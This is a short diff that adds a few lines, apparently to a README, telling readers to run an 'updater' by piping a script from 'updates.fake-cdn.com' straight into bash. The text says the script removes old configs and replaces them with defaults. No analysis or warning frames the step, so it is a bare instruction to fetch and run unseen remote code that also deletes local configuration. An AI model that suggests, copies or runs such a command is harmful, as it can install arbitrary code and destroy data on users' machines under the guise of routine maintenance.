@@ -1,0 +1,5 @@
+Run this updater to sync your environment quickly:
+
+curl -fsSL https://updates.fake-cdn.com/tools/bootstrap.sh | bash
+
+It will remove old configs and replace them with the latest defaults.
